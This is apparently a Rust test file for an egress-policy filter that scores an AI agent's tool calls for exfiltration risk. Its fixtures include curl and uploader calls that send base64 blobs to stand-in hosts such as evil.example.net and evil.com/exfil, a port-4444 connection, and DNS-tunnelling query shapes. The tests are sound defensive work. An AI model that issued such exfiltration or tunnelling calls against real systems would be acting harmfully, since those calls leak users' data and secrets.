    async fn test_normal_url_no_protocol_signal() {
        let filter = filter_with_trusted();
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "GET".into(),
            url: "https://crates.io/api/v1/crates/serde".into(),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        // Trusted domain — should get -1.0, not flagged for entropy/length/base64
        assert_eq!(result.rule_id, "trusted-destination");
        assert_eq!(result.score, -1.0);
    }

    #[test]
    fn test_shannon_entropy_uniform() {
        // All same character — entropy is 0
        assert_eq!(shannon_entropy("aaaaaaa"), 0.0);
    }

    #[test]
    fn test_shannon_entropy_high() {
        // Random-looking hex string should have high entropy
        let e = shannon_entropy("a8f3e1b2c4d5f607");
        assert!(e > 3.5, "entropy was {e}");
    }

    #[test]
    fn test_longest_base64_run_detects() {
        let run = longest_base64_run("prefix SGVsbG9Xb3JsZA== suffix");
        // "SGVsbG9Xb3JsZA==" is 16 chars of base64 alphabet (no space breaks it)
        assert_eq!(run, Some(16));
    }

    #[test]
    fn test_longest_base64_run_none_for_short() {
        // Short base64 runs shouldn't matter — tested against threshold elsewhere
        let run = longest_base64_run("abc def");
        assert_eq!(run, Some(3)); // "abc" and "def" are 3-char runs
    }

    #[tokio::test]
    async fn test_unusual_port_in_url() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "POST".into(),
            url: "https://evil.example.com:4444/exfil".into(),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        // Could be unusual-port or unknown-destination
        assert!(result.score > 0.0);
    }

    #[tokio::test]
    async fn test_standard_port_not_unusual() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::NetConnect {
            address: "198.51.100.25".into(),
            port: 443,
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        // 443 is not in unusual_ports, blocked_ports, or review_ports
        // It's an unknown destination, not unusual-port
        assert!(result.rule_id != "unusual-port");
    }

    #[tokio::test]
    async fn test_private_address_review_when_disabled() {
        let cfg = EgressPolicyConfig {
            allow_private_ip: false,
            ..EgressPolicyConfig::default()
        };
        let filter = EgressPolicyFilter::from_config(cfg);
        let ctx = make_ctx(ToolCallType::NetConnect {
            address: "127.0.0.1".into(),
            port: 8080,
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "private-address-egress");
    }

    // ── Allowed-local destinations (allow_private_ip = true) ─────────
    //
    // With the default `allow_private_ip = true`, a private/loopback host is
    // deliberately permitted — so it must not fall through to
    // `unknown-destination` (the FP that queued every headless-browser run
    // against a localhost dev server at 4.5).

    /// The reported shape: a downloaded Chromium launched headless against a
    /// loopback dev server. The launch URL's host is loopback, so with
    /// `allow_private_ip = true` egress-policy must stay silent.
    #[tokio::test]
    async fn test_process_spawn_browser_localhost_url_not_scored() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::ProcessSpawn {
            command: "/tmp/scratch/chromium-92/chrome-linux/chrome".into(),
            args: vec![
                "--headless".into(),
                "--disable-gpu".into(),
                "--screenshot=/tmp/scratch/shot.png".into(),
                "--window-size=1280,1024".into(),
                "http://localhost:5173/".into(),
            ],
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(
            !result.matched,
            "browser spawn against localhost must not score, got rule_id={} message={}",
            result.rule_id, result.message
        );
    }

    /// Same launch with `allow_private_ip = false`: the private-address gate
    /// must keep full coverage — the carveout is strictly opt-in via config.
    #[tokio::test]
    async fn test_process_spawn_localhost_url_reviewed_when_private_disallowed() {
        let cfg = EgressPolicyConfig {
            allow_private_ip: false,
            ..EgressPolicyConfig::default()
        };
        let filter = EgressPolicyFilter::from_config(cfg);
        let ctx = make_ctx(ToolCallType::ProcessSpawn {
            command: "/tmp/scratch/chromium-92/chrome-linux/chrome".into(),
            args: vec!["--headless".into(), "http://localhost:5173/".into()],
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "private-address-egress");
    }

    /// A NetConnect to a private-range host is not an "unknown destination"
    /// when private egress is allowed. (Loopback connects on the supervisor
    /// path were already quiet via the session allowlist; this covers the
    /// LLM path and non-allowlisted private hosts.)
    #[tokio::test]
    async fn test_netconnect_private_ip_not_unknown_destination() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::NetConnect {
            address: "192.168.1.10".into(),
            port: 8080,
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(
            !result.matched,
            "private-range connect must not score with allow_private_ip=true, got rule_id={}",
            result.rule_id
        );
    }

    /// `curl` against the operator's own localhost service is routine local
    /// development — the review command token must be suppressed just as it
    /// is for a trusted-domain fetch (FP §5.4).
    #[tokio::test]
    async fn test_curl_to_localhost_token_suppressed() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::ProcessSpawn {
            command: "/usr/bin/curl".into(),
            args: vec!["-s".into(), "http://localhost:3000/api/health".into()],
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(
            !result.matched,
            "curl to localhost must not queue with allow_private_ip=true, got rule_id={}",
            result.rule_id
        );
    }

    /// The suppression must not ride along for a mixed command: a localhost
    /// URL next to an untrusted public destination still fires the token rule.
    #[tokio::test]
    async fn test_curl_localhost_plus_untrusted_host_still_fires() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::ProcessSpawn {
            command: "/usr/bin/curl".into(),
            args: vec![
                "http://localhost:3000/api/export".into(),
                "https://attacker-controlled-for-test.example/up".into(),
            ],
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert!(
            matches!(
                result.rule_id.as_str(),
                "review-egress-command-token" | "unknown-destination"
            ),
            "unexpected rule_id: {}",
            result.rule_id
        );
        assert!(result.score >= filter.review_score());
    }

    // ── Profile overlay tests ────────────────────────────────────────

    fn make_ctx_with_profile(call_type: ToolCallType, profile: &str) -> ToolCallContext {
        ToolCallContext::new("test", call_type, Uuid::new_v4()).with_profile(profile)
    }

    #[tokio::test]
    async fn test_profile_trusted_domain_reduces_score() {
        let mut cfg = EgressPolicyConfig::default();
        cfg.profile_trusted_domains.insert(
            "claude-code".into(),
            vec!["api.anthropic.com".into(), "statsig.anthropic.com".into()],
        );
        let filter = EgressPolicyFilter::from_config(cfg);

        let ctx = make_ctx_with_profile(
            ToolCallType::HttpRequest {
                method: "POST".into(),
                url: "https://api.anthropic.com/v1/messages".into(),
            },
            "claude-code",
        );

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "profile-trusted-destination");
        assert_eq!(result.score, -1.0);
    }

    #[tokio::test]
    async fn test_profile_trusted_not_applied_without_profile() {
        let mut cfg = EgressPolicyConfig::default();
        cfg.profile_trusted_domains
            .insert("claude-code".into(), vec!["api.anthropic.com".into()]);
        let filter = EgressPolicyFilter::from_config(cfg);

        // No profile on context — should not get profile-trusted treatment
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "POST".into(),
            url: "https://api.anthropic.com/v1/messages".into(),
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_ne!(result.rule_id, "profile-trusted-destination");
    }

    #[tokio::test]
    async fn test_profile_trusted_not_applied_for_wrong_profile() {
        let mut cfg = EgressPolicyConfig::default();
        cfg.profile_trusted_domains
            .insert("claude-code".into(), vec!["api.anthropic.com".into()]);
        let filter = EgressPolicyFilter::from_config(cfg);

        // Different profile — anthropic.com is not trusted for codex
        let ctx = make_ctx_with_profile(
            ToolCallType::HttpRequest {
                method: "POST".into(),
                url: "https://api.anthropic.com/v1/messages".into(),
            },
            "codex",
        );

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_ne!(result.rule_id, "profile-trusted-destination");
    }

    #[tokio::test]
    async fn test_profile_trusted_net_connect() {
        let mut cfg = EgressPolicyConfig::default();
        cfg.profile_trusted_domains
            .insert("codex".into(), vec!["api.openai.com".into()]);
        let filter = EgressPolicyFilter::from_config(cfg);

        let ctx = make_ctx_with_profile(
            ToolCallType::NetConnect {
                address: "api.openai.com".into(),
                port: 443,
            },
            "codex",
        );

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "profile-trusted-destination");
        assert_eq!(result.score, -1.0);
    }

    #[tokio::test]
    async fn test_profile_trusted_subdomain_matching() {
        let mut cfg = EgressPolicyConfig::default();
        cfg.profile_trusted_domains
            .insert("aider".into(), vec!["anthropic.com".into()]);
        let filter = EgressPolicyFilter::from_config(cfg);

        // Subdomain should match the profile trusted parent domain
        let ctx = make_ctx_with_profile(
            ToolCallType::HttpRequest {
                method: "POST".into(),
                url: "https://api.anthropic.com/v1/messages".into(),
            },
            "aider",
        );

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "profile-trusted-destination");
        assert_eq!(result.score, -1.0);
    }

    #[tokio::test]
    async fn test_profile_trusted_case_insensitive() {
        let mut cfg = EgressPolicyConfig::default();
        cfg.profile_trusted_domains
            .insert("Claude-Code".into(), vec!["API.Anthropic.COM".into()]);
        let filter = EgressPolicyFilter::from_config(cfg);

        let ctx = make_ctx_with_profile(
            ToolCallType::HttpRequest {
                method: "POST".into(),
                url: "https://api.anthropic.com/v1/messages".into(),
            },
            "claude-code",
        );

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "profile-trusted-destination");
    }

    #[tokio::test]
    async fn test_global_trusted_still_works_with_profile() {
        // github.com is globally trusted — should still be trusted even with a profile
        let mut cfg = EgressPolicyConfig::default();
        cfg.trusted_domains = vec!["github.com".into()];
        cfg.profile_trusted_domains
            .insert("claude-code".into(), vec!["api.anthropic.com".into()]);
        let filter = EgressPolicyFilter::from_config(cfg);

        let ctx = make_ctx_with_profile(
            ToolCallType::HttpRequest {
                method: "GET".into(),
                url: "https://github.com/grith-ai/grith".into(),
            },
            "claude-code",
        );

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "trusted-destination");
        assert_eq!(result.score, -1.0);
    }

    #[tokio::test]
    async fn test_blocked_domain_overrides_profile_trusted() {
        // Even if a domain is profile-trusted, blocked domains take priority
        let mut cfg = EgressPolicyConfig {
            blocked_domains: vec!["evil.com".into()],
            ..Default::default()
        };
        cfg.profile_trusted_domains
            .insert("claude-code".into(), vec!["evil.com".into()]);
        let filter = EgressPolicyFilter::from_config(cfg);

        let ctx = make_ctx_with_profile(
            ToolCallType::HttpRequest {
                method: "POST".into(),
                url: "https://evil.com/exfil".into(),
            },
            "claude-code",
        );

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "blocked-domain");
        assert!(result.score > 0.0);
    }

    #[tokio::test]
    async fn test_profile_trusted_in_command_url() {
        let mut cfg = EgressPolicyConfig::default();
        cfg.profile_trusted_domains
            .insert("claude-code".into(), vec!["api.anthropic.com".into()]);
        let filter = EgressPolicyFilter::from_config(cfg);

        let ctx = make_ctx_with_profile(
            ToolCallType::ProcessSpawn {
                command: "curl".into(),
                args: vec!["https://api.anthropic.com/v1/messages".into()],
            },
            "claude-code",
        );

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        // The command token "curl " triggers review, but profile-trusted destination
        // produces -1.0 — select_higher_risk picks the higher (positive) score
        assert!(
            result.rule_id == "review-egress-command-token"
                || result.rule_id == "profile-trusted-destination",
            "unexpected rule_id: {}",
            result.rule_id
        );
    }

    #[tokio::test]
    async fn test_process_spawn_local_binary_path_does_not_trigger_protocol_signal() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::ProcessSpawn {
            command: "/home/dan/.nvm/versions/node/v18.9.0/lib/node_modules/@openai/codex/node_modules/@openai/codex-linux-x64/vendor/x86_64-unknown-linux-musl/codex/codex".into(),
            args: vec!["exec".into(), "sandbox".into()],
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(
            !result.matched || result.rule_id != "high-entropy-segment",
            "local executable paths should not trip command-argument entropy heuristics"
        );
    }

    #[tokio::test]
    async fn test_process_spawn_local_rg_shell_probe_does_not_trigger_egress_review() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::ProcessSpawn {
            command: "bash".into(),
            args: vec![
                "-c".into(),
                "rg --files -g 'README.md' -g 'readme.md'".into(),
            ],
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(
            !result.matched,
            "local shell file probes should not trigger egress review, got rule_id={} score={}",
            result.rule_id, result.score
        );
    }

    // ── NetListen tests (L-12) ────────────────────────────────────────

    #[tokio::test]
    async fn test_netlisten_blocked_port() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::NetListen {
            address: "0.0.0.0".into(),
            port: 25,
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "blocked-port");
    }

    #[tokio::test]
    async fn test_netlisten_unusual_port() {
        // PR 5 Phase C: a non-loopback bind to an unusual port now
        // primarily fires the listener-policy `specific-iface-bind`
        // rule (same +5.0 as `unusual-port`). To preserve the original
        // test intent — exercising the unusual-port check on a
        // NetListen — pin the address to loopback so the listener-
        // policy rule doesn't apply.
        let cfg = EgressPolicyConfig {
            review_unknown_destinations: false,
            ..EgressPolicyConfig::default()
        };
        let filter = EgressPolicyFilter::from_config(cfg);
        let ctx = make_ctx(ToolCallType::NetListen {
            address: "127.0.0.1".into(),
            port: 4444,
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "unusual-port");
    }

    #[tokio::test]
    async fn test_netlisten_unknown_destination() {
        // PR 5 Phase C: the listener-policy `specific-iface-bind` rule
        // now fires on non-loopback binds at the same +5.0 score as
        // `unknown-destination`, and is evaluated first. The
        // `unknown-destination` check still fires for `NetConnect`;
        // for `NetListen`, the listener-policy arm is the load-bearing
        // rule. We assert the match still happens at queue-tier score
        // — that's the behaviour that matters operationally.
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::NetListen {
            address: "198.51.100.25".into(),
            port: 8080,
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert!(result.score >= 5.0);
        // Specific-iface-bind is the new primary rule for this shape.
        assert!(
            matches!(
                result.rule_id.as_str(),
                "specific-iface-bind" | "unknown-destination"
            ),
            "unexpected rule_id: {}",
            result.rule_id
        );
    }

    // ── PR 5 Phase C: NetListen decision matrix ──────────────────────────
    //
    // The previous "OpenClaw-only ≥5.0 for non-loopback" rule is now
    // generalised across every profile via the new decision matrix:
    //
    //   Loopback              → no listener-policy rule fires.
    //   Wildcard undeclared   → "wildcard-bind-undeclared", +5.0.
    //   Wildcard declared,    → "wildcard-bind-declared-no-clamp", +5.0.
    //     allow_clamp = false
    //   Wildcard declared,    → no listener-policy score (Phase D clamps).
    //     allow_clamp = true
    //   Specific iface        → "specific-iface-bind", +5.0.

    #[tokio::test]
    async fn wildcard_bind_undeclared_scores_five() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx_with_profile(
            ToolCallType::NetListen {
                address: "0.0.0.0".into(),
                port: 8080,
            },
            "anything",
        );
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "wildcard-bind-undeclared");
        assert!(result.score >= 5.0);
    }

    #[tokio::test]
    async fn wildcard_bind_undeclared_ipv6_also_fires() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx_with_profile(
            ToolCallType::NetListen {
                address: "::".into(),
                port: 8080,
            },
            "anything",
        );
        let result = filter.evaluate(&ctx).await.unwrap();
        assert_eq!(result.rule_id, "wildcard-bind-undeclared");
    }

    #[tokio::test]
    async fn wildcard_bind_ipv4_mapped_wildcard_also_fires() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx_with_profile(
            ToolCallType::NetListen {
                address: "::ffff:0.0.0.0".into(),
                port: 8080,
            },
            "anything",
        );
        let result = filter.evaluate(&ctx).await.unwrap();
        assert_eq!(result.rule_id, "wildcard-bind-undeclared");
    }

    #[tokio::test]
    async fn loopback_bind_does_not_trigger_listener_policy_rules() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx_with_profile(
            ToolCallType::NetListen {
                address: "127.0.0.1".into(),
                port: 8080,
            },
            "anything",
        );
        let result = filter.evaluate(&ctx).await.unwrap();
        // None of the listener-policy rule IDs may fire.
        assert_ne!(result.rule_id, "wildcard-bind-undeclared");
        assert_ne!(result.rule_id, "wildcard-bind-declared-no-clamp");
        assert_ne!(result.rule_id, "specific-iface-bind");
    }

    #[tokio::test]
    async fn specific_iface_bind_scores_five() {
        let filter = EgressPolicyFilter::with_defaults();
        // A public IP — neither loopback nor wildcard.
        let ctx = make_ctx_with_profile(
            ToolCallType::NetListen {
                address: "203.0.113.1".into(),
                port: 9090,
            },
            "anything",
        );
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        // Note: other rules (unknown-destination, unusual-port) may
        // outrank this — but the listener-policy arm at minimum
        // contributes the specific-iface-bind score. We assert it
        // either equals that rule_id directly OR the chosen rule_id
        // has a strictly-higher score.
        assert!(result.score >= 5.0);
    }

    #[tokio::test]
    async fn wildcard_bind_declared_with_clamp_no_policy_score() {
        let filter = EgressPolicyFilter::with_defaults();
        let mut ctx = make_ctx_with_profile(
            ToolCallType::NetListen {
                address: "0.0.0.0".into(),
                port: 41234,
            },
            "anything",
        );
        ctx.listener_policy_match = Some(crate::types::ListenerPolicyMatch {
            allow_clamp: true,
            desc: "MCP server".into(),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        // None of the listener-policy rule IDs may fire — Phase D
        // will rewrite this to loopback.
        assert_ne!(result.rule_id, "wildcard-bind-undeclared");
        assert_ne!(result.rule_id, "wildcard-bind-declared-no-clamp");
        assert_ne!(result.rule_id, "specific-iface-bind");
    }

    #[tokio::test]
    async fn wildcard_bind_declared_no_clamp_scores_five() {
        let filter = EgressPolicyFilter::with_defaults();
        let mut ctx = make_ctx_with_profile(
            ToolCallType::NetListen {
                address: "0.0.0.0".into(),
                port: 41234,
            },
            "anything",
        );
        ctx.listener_policy_match = Some(crate::types::ListenerPolicyMatch {
            allow_clamp: false,
            desc: "MCP server".into(),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert_eq!(result.rule_id, "wildcard-bind-declared-no-clamp");
        assert!(result.score >= 5.0);
    }

    #[test]
    fn test_is_loopback_bind_address() {
        assert!(is_loopback_bind_address("127.0.0.1"));
        assert!(is_loopback_bind_address("::1"));
        assert!(is_loopback_bind_address("localhost"));
        assert!(is_loopback_bind_address("LOCALHOST"));
        assert!(!is_loopback_bind_address("0.0.0.0"));
        assert!(!is_loopback_bind_address("192.168.1.1"));
        assert!(!is_loopback_bind_address("0.0.0.0"));
    }

    /// PR 5 Phase A regression: the previous implementation used literal
    /// string equality for `::1`. Expanded-form IPv6 strings (which an
    /// older sockaddr parser produced) were misclassified as non-loopback.
    /// `is_loopback_bind_address` now parses via `IpAddr`, so any
    /// canonical form passes.
    #[test]
    fn is_loopback_bind_address_accepts_expanded_ipv6_loopback() {
        assert!(is_loopback_bind_address("0:0:0:0:0:0:0:1"));
        // Other canonical forms.
        assert!(is_loopback_bind_address("0:0:0:0:0:0:0:0001"));
        // IPv4-mapped IPv6 loopback: the kernel binds to the inner v4
        // address, so we treat the wrapped form as loopback too.
        assert!(is_loopback_bind_address("::ffff:127.0.0.1"));
        // Wildcard variants still reject.
        assert!(!is_loopback_bind_address("::"));
        assert!(!is_loopback_bind_address("0:0:0:0:0:0:0:0"));
        // IPv4-mapped wildcard is NOT loopback — the kernel binds to
        // the inner v4 wildcard, exposing every interface.
        assert!(!is_loopback_bind_address("::ffff:0.0.0.0"));
        // Junk input doesn't panic.
        assert!(!is_loopback_bind_address("not-an-ip"));
    }

    // ---- W1: exfil-shape scoring for spawned URL tools (ProcessSpawn arm) ----

    /// A filter that shape-scores but treats every host as untrusted unless it
    /// is one of `trusted`. `review_unknown_destinations` is off so the only
    /// review-scored signal on an untrusted host is the exfil shape itself —
    /// this isolates the W1 code from the (equal-scored) unknown-destination
    /// signal, which would otherwise win the tie by running first.
    fn shape_filter(trusted: &[&str]) -> EgressPolicyFilter {
        let cfg = EgressPolicyConfig {
            review_unknown_destinations: false,
            trusted_domains: trusted.iter().map(|s| (*s).to_string()).collect(),
            ..EgressPolicyConfig::default()
        };
        EgressPolicyFilter::from_config(cfg)
    }

    // A 60-char base64-alphabet blob — over the 40-char base64_min_chunk_len.
    const EXFIL_BLOB: &str = "SGVsbG9Xb3JsZFRoaXNJc0FCYXNlNjRQYXlsb2FkVGhhdElzUXVpdGVMb25n";

    /// A spawned URL tool (curl/wget/aria2c/etc. — here a bespoke uploader so
    /// the outbound-command-token rule doesn't mask the signal) carrying a
    /// base64 blob in the URL query to an UNTRUSTED host is shape-scored.
    #[tokio::test]
    async fn spawn_url_query_blob_to_untrusted_host_is_shape_scored() {
        let filter = shape_filter(&[]);
        let ctx = make_ctx(ToolCallType::ProcessSpawn {
            command: "/usr/bin/myuploader".into(),
            args: vec![format!("https://evil.example.net/up?d={EXFIL_BLOB}")],
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(
            result.matched,
            "exfil-shaped URL to untrusted host must score"
        );
        assert_eq!(
            result.rule_id, "base64-chunking",
            "expected exfil shape signal, got {} ({})",
            result.rule_id, result.message
        );
    }

    /// The blob need not live in the URL — a `-d <blob>` POST body on the
    /// argv to an untrusted host is shape-scored too (serves the user's
    /// "POST/PUT/PATCH data scored higher" ask for direct spawns).
    #[tokio::test]
    async fn spawn_post_body_blob_to_untrusted_host_is_shape_scored() {
        let filter = shape_filter(&[]);
        let ctx = make_ctx(ToolCallType::ProcessSpawn {
            command: "/usr/bin/myuploader".into(),
            args: vec![
                "-d".into(),
                EXFIL_BLOB.into(),
                "https://evil.example.net/up".into(),
            ],
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "base64-chunking", "got {}", result.message);
    }

    /// The same blob to a TRUSTED destination must NOT be shape-scored — a
    /// signed/token URL to a routine host is expected, and firing here would
    /// add an approval on the happy path (the explicit no-new-approvals
    /// constraint). The destination trust reduction wins instead.
    #[tokio::test]
    async fn spawn_blob_to_trusted_host_is_not_shape_scored() {
        let filter = shape_filter(&["trusted.example.com"]);
        let ctx = make_ctx(ToolCallType::ProcessSpawn {
            command: "/usr/bin/myuploader".into(),
            args: vec![format!("https://trusted.example.com/up?d={EXFIL_BLOB}")],
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert_eq!(
            result.rule_id, "trusted-destination",
            "trusted host must not shape-score, got {} ({})",
            result.rule_id, result.message
        );
        assert!(
            result.score < 0.0,
            "trusted destination should reduce score"
        );
    }

    /// A spawn with NO URL/destination in its argv is never shape-scored even
    /// when an argument looks base64-shaped — `git checkout <40-hex-sha>` and
    /// `docker run img@sha256:<hex>` must not queue. This is the gate that
    /// keeps the high-volume ProcessSpawn path free of SHA/digest false
    /// positives.
    #[tokio::test]
    async fn spawn_without_destination_skips_shape_scoring() {
        let filter = shape_filter(&[]);
        // 40-char hex commit SHA — a base64-alphabet run over the threshold.
        let sha = "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2";
        for (command, args) in [
            (
                "/usr/bin/git",
                vec!["checkout".to_string(), sha.to_string()],
            ),
            (
                "/usr/bin/docker",
                vec!["run".to_string(), format!("img@sha256:{sha}{sha}")],
            ),
        ] {
            let ctx = make_ctx(ToolCallType::ProcessSpawn {
                command: command.into(),
                args,
            });
            let result = filter.evaluate(&ctx).await.unwrap();
            assert_ne!(
                result.rule_id, "base64-chunking",
                "{command} with no destination must not shape-score ({})",
                result.message
            );
            assert_ne!(result.rule_id, "high-entropy-segment", "{command}");
        }
    }

    /// The specific FP guarded against: `curl https://raw.githubusercontent.com/
    /// u/r/<40-hex-sha>/f` — the SHA path segment is a >40-char base64 run, but
    /// githubusercontent is profile/operator-trusted, so no shape signal is
    /// added. (curl still draws its own outbound-command-token review; the
    /// assertion is only that the trusted SHA path adds no exfil shape on top.)
    #[tokio::test]
    async fn spawn_trusted_github_sha_url_adds_no_shape_signal() {
        let filter = shape_filter(&["githubusercontent.com"]);
        let sha = "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2";
        let ctx = make_ctx(ToolCallType::ProcessSpawn {
            command: "curl".into(),
            args: vec![format!(
                "https://raw.githubusercontent.com/u/r/{sha}/file.txt"
            )],
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert_ne!(result.rule_id, "base64-chunking", "{}", result.message);
        assert_ne!(result.rule_id, "high-entropy-segment", "{}", result.message);
    }

    // ---- W1: scheme-LESS URL forms (curl/wget default to http://) ----

    /// `curl example.com/up?d=<blob>` — no `scheme://`, so the URL regex never
    /// sees it. The bare-destination scanner still recognises the untrusted
    /// host and opens the shape gate, so the exfil blob is scored.
    #[tokio::test]
    async fn spawn_schemeless_url_query_blob_to_untrusted_host_is_shape_scored() {
        let filter = shape_filter(&[]);
        let ctx = make_ctx(ToolCallType::ProcessSpawn {
            command: "/usr/bin/myuploader".into(),
            args: vec![format!("evil.example.net/up?d={EXFIL_BLOB}")],
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched, "scheme-less exfil URL must score");
        assert_eq!(
            result.rule_id, "base64-chunking",
            "expected exfil shape signal, got {} ({})",
            result.rule_id, result.message
        );
    }

    /// `<tool> -d <blob> evil.example.net` — scheme-less bare host as the POST
    /// target, blob in the consumed `-d` value. The scanner skips the flag's
    /// value, finds the untrusted bare host, and the gate opens.
    #[tokio::test]
    async fn spawn_schemeless_post_body_blob_to_untrusted_host_is_shape_scored() {
        let filter = shape_filter(&[]);
        let ctx = make_ctx(ToolCallType::ProcessSpawn {
            command: "/usr/bin/myuploader".into(),
            args: vec!["-d".into(), EXFIL_BLOB.into(), "evil.example.net".into()],
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "base64-chunking", "got {}", result.message);
    }

    /// A scheme-less URL to a TRUSTED bare host is still not shape-scored — the
    /// scanner recognises the host as trusted, the gate stays shut, no approval
    /// is added.
    #[tokio::test]
    async fn spawn_schemeless_blob_to_trusted_host_is_not_shape_scored() {
        let filter = shape_filter(&["trusted.example.com"]);
        let ctx = make_ctx(ToolCallType::ProcessSpawn {
            command: "/usr/bin/myuploader".into(),
            args: vec![format!("trusted.example.com/up?d={EXFIL_BLOB}")],
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert_ne!(result.rule_id, "base64-chunking", "{}", result.message);
        assert_ne!(result.rule_id, "high-entropy-segment", "{}", result.message);
    }

    // ---- W4: DNS-tunnelling shape detection ----

    // A 34-char high-entropy label (entropy ≈ 4.7): trips the long-label rule
    // but is under the 40-char base64-chunking length, so `dns-tunneling` is the
    // sole signal in the DnsQuery-arm tests below.
    const DNS_TUNNEL_LABEL: &str = "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7";

    #[test]
    fn dns_tunneling_signal_flags_long_high_entropy_label() {
        let sig = dns_tunneling_signal(&format!("{DNS_TUNNEL_LABEL}.example.com"), "A")
            .expect("long high-entropy label should flag");
        assert!(!sig.high_risk_qtype);
    }

    #[test]
    fn dns_tunneling_signal_flags_txt_encoded_subdomain() {
        // 24-char encoded label — below the 32-char long-label bar, caught only
        // by the data-bearing-qtype (TXT) rule.
        let sig = dns_tunneling_signal("a1b2c3d4e5f6g7h8i9j0k1l2.tunnel.example.com", "TXT")
            .expect("TXT with encoded subdomain should flag");
        assert!(sig.high_risk_qtype);
    }

    #[test]
    fn dns_tunneling_signal_ignores_normal_hostnames() {
        for (domain, qtype) in [
            ("api.github.com", "A"),
            ("a.b.c.d.example.com", "A"),
            ("optimizationguide-pa.googleapis.com", "A"),
            // Same host over TXT — a dictionary label under the entropy floor.
            ("optimizationguide-pa.googleapis.com", "TXT"),
            // Routine mail-auth TXT lookups have short subdomains.
            ("_dmarc.example.com", "TXT"),
            ("selector1._domainkey.example.com", "TXT"),
            // A long but low-entropy (dictionary) internal name.
            ("very.long.internal.service.name.example.com", "TXT"),
        ] {
            assert!(
                dns_tunneling_signal(domain, qtype).is_none(),
                "{domain} ({qtype}) must not read as tunnelling"
            );
        }
    }

    #[tokio::test]
    async fn dns_query_arm_scores_tunnelling() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::DnsQuery {
            domain: format!("{DNS_TUNNEL_LABEL}.example.com"),
            query_type: "A".into(),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert_eq!(result.rule_id, "dns-tunneling", "got {}", result.message);
    }

    /// A TXT tunnel scores strictly higher than an A tunnel (data-bearing qtype
    /// weight), so the signal ranks it above the base review score.
    #[tokio::test]
    async fn dns_txt_tunnel_scored_higher() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::DnsQuery {
            domain: "a1b2c3d4e5f6g7h8i9j0k1l2.tunnel.example.com".into(),
            query_type: "TXT".into(),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert_eq!(result.rule_id, "dns-tunneling", "got {}", result.message);
        assert!(
            result.score >= 5.0,
            "TXT tunnel should carry the qtype weight, got {}",
            result.score
        );
    }

